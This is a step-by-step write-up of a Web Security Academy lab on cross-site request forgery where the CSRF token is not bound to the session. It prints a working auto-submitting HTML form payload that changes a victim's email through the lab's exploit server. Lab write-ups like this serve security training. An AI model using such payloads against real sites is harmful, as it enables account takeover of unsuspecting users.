## Solution steps

- Login using the provided credentials.
- Open Burp Suite and set-up proxy.
- Turn the intercept ON.
- Submit the "Update email" form.
- Make a note of the value of the `CSRF` token, then drop the request.
- Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.
- Observe that if you swap the `CSRF` token with the value from the other account, then the request is accepted.
- **Note**: The CSRF tokens are single-use, so you'll need to include a fresh one.
- Copy the contents of the request and paste it in an online CSRF PoC Generator. I used: https://hacktify.in/csrf/
- Change the email address in your exploit so that it doesn't match your own.
- Add `<script>document.forms[0].submit();</script>` to the payload so you don't have to click the `submit` button.
- Copy the CSRF PoC FORM's contents and open the exploit server.
- Paste it in the `Body`:
  ```
  <html>
  	<body>
  		<form method="POST" action="https://xxxxxx.web-security-academy.net/my-account/change-email">
  			<input type="hidden" name="email" value="tester@carlos.net"/>
  			<input type="hidden" name="csrf" value="CSRF_TOKEN"/>
  			<input type="submit" value="Submit">
  		</form>
  <script>
          document.forms[0].submit();
  </script>
  	</body>
  <html>
  ```
- Store the exploit, then click "Deliver to victim" to solve the lab.
